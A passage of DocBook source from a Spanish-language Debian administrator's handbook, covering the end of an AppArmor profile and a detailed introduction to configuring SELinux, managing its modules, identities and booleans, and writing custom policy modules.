  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Introducción a SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Principios</title>

      <para>SELinux (<emphasis>Linux con seguridad mejorada</emphasis>: «Security Enhanced Linux») es un sistema de <emphasis>control obligatorio de acceso</emphasis> («Mandatory Access Control») basado en la interfaz LSM  (<emphasis>módulos de seguridad de Linux</emphasis>: «Linux Security Modules»). En la práctica, el núcleo pregunta a SELinux antes de cada llamada al sistema para saber si un proceso está autorizado a realizar dicha operación.</para>

      <para>SELinux utiliza una serie de reglas — conocidas en conjunto como una <emphasis>política</emphasis> («policy») — para autorizar o denegar operaciones. Estas reglas son difíciles de crear. Afortunadamente se proporcionan dos políticas estándar (<emphasis>targeted</emphasis>, dirigida, y <emphasis>strict</emphasis>, estricta) para evitar gran parte del trabajo de configuración.</para>

      <para>Con SELinux, la gestión de permisos es completamente distinta a la de los sistemas Unix tradicionales. Los permisos de un proceso dependen de su <emphasis>contexto de seguridad</emphasis>. El contexto está definido por la <emphasis>identidad</emphasis> del usuario que lanza el proceso y el <emphasis>rol</emphasis> y el <emphasis>dominio</emphasis> que el usuario tenía en ese momento. Los permisos realmente dependen del dominio, pero los roles controlan la transición entre dominios. Por último, las transiciones posibles entre roles dependen de la identidad.</para>

      <figure>
        <title>Contextos de seguridad y usuarios Unix</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>En la práctica, a un usuario se le asigna un contexto de seguridad predeterminado al iniciar sesión (dependiendo de los roles que pueda adoptar). Esto define el dominio actual y, por lo tanto, el dominio de todos los procesos hijos que lance. Si desea cambiar el rol actual y su dominio asociado, debe ejecutar <command>newrole -r <replaceable>rol_r</replaceable> -t <replaceable>dominio_t</replaceable></command> (habitualmente se permite un único dominio para un rol determinado por lo que puede omitir el parámetro <literal>-t</literal>). Este programa lo autenticará pidiéndole que ingrese su contraseña. Esta característica impide que los programas cambien de rol de forma automática. Estos cambios sólo pueden ocurrir si se permiten explícitamente en la política de seguridad de SELinux.</para>

      <para>Obviamente los permisos no se aplican a todos los <emphasis>objetos</emphasis> (archivos, directorios, zócalos, dispositivos, etc.). Pueden variar de objeto a objeto. Para conseguir esto, cada objeto está asociado a un <emphasis>tipo</emphasis> (esta operación se conoce como etiquetado). Por ello se expresan los permisos de los dominios como conjuntos de operaciones permitidas o denegadas sobre estos tipos (e indirectamente sobre todos los objetos que estan etiquetados con dicho tipo).</para>

      <sidebar>
        <title><emphasis>EXTRA</emphasis> Los dominios y los tipos son equivalentes</title>

	<para>Internamente un dominio es simplemente un tipo, pero un tipo que sólo se aplica a procesos. Es por esta razón que los dominios tienen el sufijo <literal>_t</literal> al igual que los tipos de objeto.</para>
      </sidebar>

      <para>De forma predeterminada, los programas heredan el dominio del usuario que los ejecuta, pero las políticas estándar de SELinux esperan que muchos programas importantes se ejecuten en dominios dedicados. Para conseguir esto, se etiquetan dichos ejecutables con un tipo dedicado (por ejemplo, se etiqueta <command>ssh</command> con <literal>ssh_exec_t</literal> y, cuando inicia el programa, automáticamente cambia al dominio <literal>ssh_t</literal>). Este mecanismo de transición automática de dominios permite otorgar exclusivamente los permisos que requiere cada programa. Es un principio fundamental de SELinux.</para>

      <figure>
        <title>Transiciones automáticas entre dominios</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>EN LA PRÁCTICA</emphasis> Averiguar el contexto de seguridad</title>
        <indexterm><primary>seguridad, contexto de</primary></indexterm>
        <indexterm><primary>contexto de seguridad</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>seguridad multicategoría</emphasis>: «Multi-Category Security»)</primary></indexterm>

	<para>Para averiguar el contexto de seguridad de un proceso, debe utilizar la opción <literal>Z</literal> de <command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>El primer campo contiene la identidad, el rol, el dominio y el nivel MCS separados por dos puntos. El nivel MCS (<emphasis>seguridad multicategoría</emphasis>: «Multi-Category Security») es un parámetro que interviene en el establecimiento de una política de protección de la confidencialidad, que regula el acceso a archivos basándose en su sensibilidad. No explicaremos esta característica en este libro.</para>

	<para>Para averiguar el contexto de seguridad em una consola, puede ejecutar <command>id -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Por último, para averiguar el tipo asignado a un archivo, puede utilizar <command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>Es importante saber que la identidad y rol asignados a un archivo no tienen importancia especial (nunca son utilizados), pero se le asigna un contexto de seguridad completo a todos los objetos para mantener la uniformidad.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>Configuración de SELinux</title>

      <para>Todos los núcleos estándar que Debian proporciona incluyen compatibilidad con SELinux. Todas las herramientas básicas Unix son compatibles con SELinux sin ninguna modificación. Por lo tanto, es relativamente sencillo habilitar SELinux.</para>

      <para>La orden <command>apt install selinux-basics selinux-policy-default</command> instalará automáticamente todos los paquetes necesarios para configurar un sistema SELinux.</para>

      <sidebar>
        <title><emphasis>PRECAUCIÓN</emphasis> Política de referencia ausente en Jessie</title>
        <para>Desgraciadamente, los mantenedores del paquete fuente  <emphasis role="pkg">refpolicy</emphasis> no solucionaron a tiempo los fallos críticos y por la tanto tuvo que ser suprimido en Jessie. En la práctica, esto significa que los paquetes <emphasis role="pkg">selinux-policy-*</emphasis> no están disponibles en Jessie y tienen que obtenerse de alguna otra distribución. Es de esperar que vuelvan a estar disponibles en una versión de arreglo de fallos (versión menor/point release) o mediante las retroadaptaciones. Mientras tanto se pueden descargar desde Unstable.</para>
        <para>Esta situación desgraciada muestra al menos que SELinux no es demasiado popular entre los usuarios y desarrolladores que utilizan las versiones de desarrollo de Debian. Por lo tanto, si se opta por utilizar SELinux, puede ser necesario invertir bastante tiempo para adaptarlo a las necesidades específicas que se tengan.</para>
      </sidebar>

      <para>El paquete <emphasis role="pkg">selinux-policy-default</emphasis> contiene un conjunto de reglas estándar. De forma predeterminada, esta política sólo restringe el acceso a algunos servicios expuestos ampliamente. Las sesiones de usuario no están restringidas y, por lo tanto, es improbable que SELinux bloquee una operación legítima de un usuario. Sin embargo, mejora la seguridad de los servicios del sistema que estén ejecutando en la máquina. Para establecer una política equivalente a las reglas «estrictas» antiguas debe deshabilitar el módulo <literal>unconfined</literal> (detallamos la gestión de módulos más adelante en esta sección).</para>

      <para>Después de instalar una política, debe etiquetar todos los archivos disponibles (lo que quiere decir asignarles un tipo). Debe iniciar esta operación manualmente con <command>fixfiles relabel</command>.</para>

      <para>Ahora el sistema SELinux está listo. Para habilitarlo debe añadir el parámetro <literal>selinux=1 security=selinux</literal> al núcleo Linux. El parámetro <literal>audit=1</literal> habilita los registros de SELinux que graban todas las operaciones denegadas. Por último, el parámetro <literal>enforcing=1</literal> hace que se apliquen las reglas: sin él, SELinux trabaja en el modo predeterminado <emphasis>permissive</emphasis> (permisivo) en el que las acciones prohibidas son registradas pero son ejecutadas de todas formas. Por lo tanto, debe modificar el archivo de configuración del gestor de arranque GRUB para añadir los parámetros que desee. Una forma sencilla de hacerlo es modificar la variable <literal>GRUB_CMDLINE_LINUX</literal> en el archivo <filename>/etc/default/grub</filename> y ejecutar <command>update-grub</command>. SELinux estará activo al reiniciar.</para>

      <para>Es importante saber que el script <command>selinux-activate</command> automatiza todas estas operaciones y fuerza el etiquetado de archivos en el siguiente reinicio (lo que evita que se creen nuevos archivos sin etiquetar cuando SELinux aún no esta activo mientras se realiza el etiquetado).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Gestión de un sistema SELinux</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>La política SELinux consiste en un conjunto de reglas modular, y su instalación detecta y habilita automáticamente todos los módulos necesarios en función de los servicios que se encuentren instalados. El sistema, por lo tanto, se encuentra operativo de forma inmediata. Sin embargo, cuando instale un servicio después de haber instalado la política SELinux deberá habilitar el módulo correspondiente manualmente. Para ello existe el programa <command>semodule</command>. Lo que es más, debería tener la capacidad de definir los roles que cada usuario puede adoptar, lo que puede realizar con el programa <command>semanage</command>.</para>

      <para>Puede utilizar estos dos programas para modificar la configuración actual de SELinux, almacenada en <filename>/etc/selinux/default/</filename>. A diferencia de otros archivos de configuración que puede encontrar en <filename>/etc/</filename>, no debe modificar estos archivos manualmente. Debe utilizar los programas diseñados para este propósito.</para>

      <sidebar>
        <title><emphasis>YENDO MÁS ALLÁ</emphasis> Más documentación</title>

	<para>Puesto que su desarrollador original, la agencia nacional de seguridad estadounidense (NSA: «National Security Agency») no proporciona documentación oficial, la comunidad ha creado un wiki para compensarlo. Dispone de mucha información, pero debe tener en cuenta que la mayoría de los que contribuyen a SELinux son usuarios de Fedora (en la que SELinux está habilitado de forma predeterminada). Por este motivo la documentación suele tratar con dicha distribución específicamente. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>También debería revisar la página del wiki de Debian dedicada a este tema, así como al blog de Russell Coker, que es uno de los desarrolladores Debian más activos que trabaja en la compatibilidad con SELinux. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>Gestión de módulos SELinux</title>

	<para>Los módulos SELinux disponibles se almacenan en el directorio <filename>/usr/share/selinux/default/</filename>. Para habilitar uno de estos módulos en la configuración actual debe ejecutar <command>semodule -i <replaceable>módulo.pp.bz2</replaceable></command>. La extensión <emphasis>pp.bz2</emphasis> significa <emphasis>paquete de política</emphasis> («policy package») comprimido mediante bzip2.</para>

	<para>Puede eliminar un módulo de la configuración actual con <command>semodule -r <replaceable>módulo</replaceable></command>. Por último, <command>semodule -l</command> enumera los módulos instalados actualmente. También imprime los números de versión correspondientes. Los módulos puden ser activados selectivamente con  <command>semodule -e</command> y desactivados mediante <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> carga inmediatamente la nueva configuración a menos que utilice la opción <literal>-n</literal>. De forma predeterminada, el programa actúa sobre la configuración actual (indicada por la variable <literal>SELINUXTYPE</literal> en el archivo <filename>/etc/selinux/config</filename>), pero también puede modificar una distinta especificándola con la opción <literal>-s</literal>.</para>
      </section>
      <section>
        <title>Gestión de identidades</title>

	<para>Cada vez que un usuario inicia sesión, se le asigna una identidad SELinux. Esta identidad determina los roles que puede adoptar. Puede configurar estas correspondencias (entre el usuario y la identidad y entre la identidad y los roles) con el programa <command>semanage</command>.</para>

	<para>Es muy recomenable que lea la página de manual <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>, incluso cuando la sintaxis del programa tienda a ser similar para todos los conceptos que gestiona. Encontrará muchas opciones comunes a todas las subórdenes: <literal>-a</literal> para agregar, <literal>-d</literal> para borrar, <literal>-m</literal> para modificar, <literal>-l</literal> para enumerar y <literal>-t</literal> para indicar un tipo (o dominio).</para>

	<para><command>semanage login -l</command> enumera las correspondencias actuales entre identificadores de usuarios y entidades SELinux. Los usuarios que no aparecen explícitamente poseen la identidad predeterminada, que corresponde al elemento <literal>__default__</literal>. Si ejecuta <command>semanage login -a -s user_u <replaceable>usuario</replaceable></command>, asociará la identidad <emphasis>user_u</emphasis> con el usuario dado. Por último, <command>semanage login -d <replaceable>usuario</replaceable></command> elimina la asociación asignada al usuario.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> enumera las asociaciones entre las identidades de usuario de SELinux y los roles permitidos. Agregar una nueva identidad requiere definir tanto sus roles correspondientes como un prefijo de etiquetado que se utiliza para asignar un tipo a los archivos personales (<filename>/home/<replaceable>usuario</replaceable>/*</filename>). Debe elegir el prefijo entre <literal>user</literal>, <literal>staff</literal> y <literal>sysadm</literal>. El prefijo «<literal>staff</literal>» hace que los archivos sean del tipo «<literal>staff_home_dir_t</literal>». Para crear una nueva identidad de usuario SELinux, ejecute <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefijo</replaceable> <replaceable>identidad</replaceable></command>. Puede eliminar una identidad de usuario SELinux ejecutando <command>semanage user -d <replaceable>identidad</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>Gestión de contextos de archivos, puertos y valores booleanos</title>

	<para>Cada módulo de SELinux proporciona un conjunto de reglas de etiquetado de archivos, pero también es posible crear reglas de etiquetado personalizadas para adaptarse a algún caso específico. Por ejemplo, si desea que el servidor web sea capaz de leer archivos en el directorio <filename>/srv/www/</filename>, podría ejecutar <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> seguido de <command>restorecon -R /srv/www/</command>. La primera ejecución registra las nuevas reglas de etiquetado, mientras que la segunda hace que se reinicialicen los tipos de archivo según las reglas de etiquetado actuales.</para>

	<para>De forma similar, se etiquetan los puertos TCP/UDP de forma que asegure que únicamente los demonios correspondientes puedan escuchar en ellos. Por ejemplo, si desea que el servidor web pueda escuchar en el puerto 8080, deberá ejecutar <command>semanage port -m -t http_port_t -p tcp 8080</command>.</para>

	<para>Algunos módulos de SELinux exportan opciones booleanas que puede ajustar para alterar el comportamiento de las reglas predeterminadas. Puede utilizar la herramienta <command>getsebool</command> para inspeccionar estas opciones (<command>getsebool <replaceable>opcion_booleana</replaceable></command> muestra una opción concreta, mientras que <command>getsebool -a</command> muestra todas). La orden <command>setsebool <replaceable>opción_booleana</replaceable> <replaceable>valor</replaceable></command> cambia el valor de una opción booleana. La opción <literal>-P</literal> hace que el cambio sea permanente, es decir que el nuevo valor se convierte en el predeterminado y se mantiene después de reiniciar el equipo. El ejemplo a continuación permite a los servidores web acceso a los directorios personales (esto es útil cuando los usuarios tienen sitios web personales en <filename>~/public_html/</filename>).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Adaptación de las reglas</title>

      <para>Puesto que la política SELinux es modular, puede ser interesante desarrollar nuevos módulos para aplicaciones (posiblemente propias) que carezcan de uno. Estos nuevos módulos completarán la <emphasis>política de referencia</emphasis>.</para>

      <para>Para crear nuevos módulos, necesitará los paquetes <emphasis role="pkg">selinux-policy-dev</emphasis> y <emphasis role="pkg">selinux-policy-doc</emphasis>. Este último contiene la documentación de las reglas estándar (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) y los archivos de ejemplo que puede utilizar como plantillas para crear nuevo módulos. Instale estos módulos y estúdielos detenidamente:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>El archivo <filename>.te</filename> es el más importante. Define las reglas. El archivo <filename>.fc</filename> define los «contextos de archivo», es decir los tipos asignados a los archivos relacionados con este módulo. Los datos del archivo <filename>.fc</filename> se utilizan durante el paso de etiquetado de archivos. Por último, el archivo <filename>.if</filename> define la interfaz del módulo: es una serie de «funciones públicas» que otros módulos pueden utilizar para interactuar con el módulo que se está creando.</para>
      <section>
        <title>Creación de un archivo <filename>.fc</filename></title>

	<para>Leer el ejemplo a continuación debería ser suficiente para entender la estructura de este tipo de archivos. Puede utilizar expresiones regulares para asignar el mismo contexto de seguridad a múltiples archivos, o incluso a un árbol de directorios completo.</para>

        <example>
          <title>Archivo <filename>example.fc</filename></title>

          <programlisting role="scale"># El ejecutable myapp tendrá:
# etiqueta: system_u:object_r:myapp_exec_t
# Sensibilidad MLS: s0
# Categorías MCS: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>Creación de un archivo <filename>.if</filename></title>

	<para>En el ejemplo a continuación, la primera interfaz («<literal>myapp_domtrans</literal>») controla quién puede utilizar la aplicación. La segunda («<literal>myapp_read_log</literal>») otorga permisos de escritura a los archivos de registro de la aplicación.</para>

	<para>Cada interfaz debe generar un conjunto de reglas válido que pueda ser integrado en un archivo <filename>.te</filename>. Por lo tanto, debe declarar todos los tipos que utilizará (con el macro <literal>gen_require</literal>) y utilizar directivas estándar para otorgar permisos. Sepa que puede utilizar interfaces proporcionadas por otros módulos. La siguiente sección dará más explicaciones sobre cómo expresar estos permisos.</para>

        <example>
          <title>Archivo <filename>ejemplo.if</filename></title>

          <programlisting>## &lt;summary&gt;Política de ejemplo de Myapp&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              Texto más descriptivo de myapp. La etiqueta &lt;desc&gt;
##              también puede utilizar etiquetas HTML &lt;p&gt;,
##              &lt;ul&gt;, and &lt;ol&gt; para dar formato.
##      &lt;/p&gt;
##      &lt;p&gt;
##              Esta política es compatible con las siguientes 
##              funcionalidades de myapp:
##              &lt;ul&gt;
##              &lt;li&gt;Funcionalidad A&lt;/li&gt;
##              &lt;li&gt;Funcionalidad B&lt;/li&gt;
##              &lt;li&gt;Funcionalidad C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Ejecutar una transición de dominio para ejecutar myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Dominio permitido para la transición
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Leer archivos de registro de myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Dominio al que se le permite leer archivos de registro.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTACIÓN</emphasis> Explicaciones sobre la <emphasis>política de referencia</emphasis></title>

	  <para>La <emphasis>política de referencia</emphasis> evoluciona como cualquier proyecto de software libre: basada en contribuciones de voluntarios. Tresys, una de las compañías más activas en el ámbito de SELinux, alberga el proyecto. Su wiki contiene explicaciones sobre la estructura de las reglas y cómo puede crear nuevas. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Escritura de un archivo <filename>.te</filename></title>

	<para>Revise el archivo <filename>example.te</filename>:</para>

        <sidebar>
          <title><emphasis>YENDO MÁS ALLÁ</emphasis> El lenguaje de macro <command>m4</command></title>

	  <para>Para estructurar la política correctamente, los desarrolladores de SELinux utilizaron un procesador de macros. En lugar de duplicar muchas directivas <emphasis>allow</emphasis> similares, crearon «funciones macro» para utilizar una lógica de más alto nivel que también resulta en una política mucho más legible.</para>

	  <para>En la práctica, utilizamos <command>m4</command> para compilar estas reglas. Realizar la operación opuesta: expande todas las directivas de alto nivel en una base de datos gigante de directivas <emphasis>allow</emphasis>.</para>

	  <para>Las «interfaces» SELinux son sólo funciones macro que serán substituidas por un conjunto de reglas en tiempo de compilación. De la misma forma, algunos permisos son en realidad conjuntos de permisos que son reemplazados por sus valores en tiempo de compilación.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declaraciones
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Política local de Myapp
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>El módulo debe ser identificado por su nombre y número de versión. Esta directiva es obligatoria.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>Si el módulo introduce tipos nuevos, debe declararlos con directivas como las siguientes. No dude en crear tantos tipos como necesite en lugar de otorgar demasiados permisos inútiles.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Dichas interfaces definen el tipo <literal>myapp_t</literal> como un dominio de proceso que cualquier ejecutable con la etiqueta <literal>myapp_exec_t</literal> debería utilizar. Implícitamente, esto agrega un atributo <literal>exec_type</literal> en estos objetos, lo que a su vez permite a otros módulos otorgar permisos para ejecutar dichos programas: por ejemplo, el módulo <literal>userdomain</literal> permite que los ejecuten los proceso con dominios <literal>user_t</literal>, <literal>staff_t</literal> y <literal>sysadm_t</literal>. Los dominios de otras aplicaciones confinadas no tendrán los permisos para ejecutarlos a menos que las reglas les otorguen permisos similares (este es el caso, por ejemplo, de <command>dpkg</command> con su dominio <literal>dpkg_t</literal>).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> es una interfaz provista por la política de referencia. Indica que los archivos etiquetados con el tipo dado son archivos de registro que deben gozar de los beneficios de las reglas asociadas (por ejemplo, otorgando permisos a <command>logrotate</command> para que los pueda manipular).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>La directiva <literal>allow</literal> es la directiva base para autorizar una operación. El primer parámetro es el dominio de proceso al que se le permite ejecutar la operación. El segundo define el objeto que puede manipular un proceso del dominio anterior. Este parámetro debe estar en el formato «<replaceable>tipo</replaceable>:<replaceable>clase</replaceable>», en el que <replaceable>tipo</replaceable> es el tipo SELinux y <replaceable>clase</replaceable> describe la naturaleza del objeto (archivo, directorio, zócalo, tubería, etc.). Finalmente, el último parámetro describe los permisos (las operaciones permitidas).</para>

	    <para>Los permisos están definidos como el conjunto de operaciones permitidas y siguen la siguiente plantilla: <literal>{ <replaceable> operación1</replaceable> <replaceable>operación2</replaceable> }</literal>. Sin embargo, también puede utilizar macros que representan los permisos más útiles. El archivo <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> los enumera.</para>

	    <para>La siguiente página web provee una lista relativamente exhaustiva de las clases de objetos y los permisos que puede otorgar. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Ahora sólo debe encontrar el conjunto mínimo de reglas necesario para asegurar que la aplicación o servicio objetivo funcione correctamente. Para lograrlo, debería tener buen conocimiento de cómo funciona la aplicación y qué tipo de datos genera o administra.</para>

	<para>Sin embargo, es posible un enfoque empírico. Una vez que se etiquetaron correctamente los objetos relevantes, puede utilizar la aplicación en modo permisivo: las operaciones que hubiesen estado bloqueadas son registradas pero ejecutarán correctamente. Si analiza los registros, ahora puede identificar las operaciones a permitir. A continuación encontrará un ejemplo de elemento en dicho registro:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>Para entender mejor este mensaje, estudiémoslo parte por parte.</para>

        <table colsep="1">
          <title>Análisis de una traza SELinux</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Mensaje</entry>
                <entry>Descripción</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>Se denegó una operación.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>Esta operación necesita los permisos <literal>read</literal> y <literal>write</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>El proceso con PID 1876 ejecutó la operación (o intentó hacerlo).</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>Este proceso era una instancia del programa <literal>syslogd</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>El objeto de destino se llamaba <literal>xconsole</literal>. En ciertos casos también se puede tener una variable «path» con una ruta completa.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>El dispositivo que alberga el objeto destino es un <literal>tmpfs</literal> (sistema de archivos en memoria). Para un disco real, podría ver la partición que alberga el objeto (por ejemplo: «sda3»).</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>El objeto está identificado por el número de inodo 5510.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>Este es el contexto de seguridad del proceso que ejecutó la operación.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>Este es el contexto de seguridad del objeto destino.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>El objeto destino es un archivo FIFO.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>Observando esta entrada de registro, es posible crear una regla que permitiría esta operación. Por ejemplo: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Se puede automatizar este proceso, que es exactamente lo que ofrece el paquete <command>audit2allow</command> (del paquete <emphasis role="pkg">policycoreutils</emphasis>. Este enfoque sólo es útil si ya están etiquetados correctamente los muchos objetos que deben ser confinados. En cualquier caso, debe revisar cuidadosamente las reglas generadas y validarlas según su conocimiento de la aplicación. En efecto, este enfoque tiende a otorgar más permisos de los que son realmente necesarios. La solución apropiada generalmente es crear nuevos tipos y otorgar los permisos sólo sobre dichos tipos. También puede suceder que denegar una operación no es fatal para la aplicación, en cuyo caso podría ser mejor simplemente agregar una regla «<literal>dontaudit</literal>» para evitar que sea registrada a pesar de que sea denegada.</para>

        <sidebar>
          <title><emphasis>COMPLEMENTOS</emphasis> Falta de roles en las reglas de la política</title>
          <indexterm><primary>Tipo («Type»), forzado de tipos</primary></indexterm>
          <indexterm><primary>forzado de tipos</primary></indexterm>

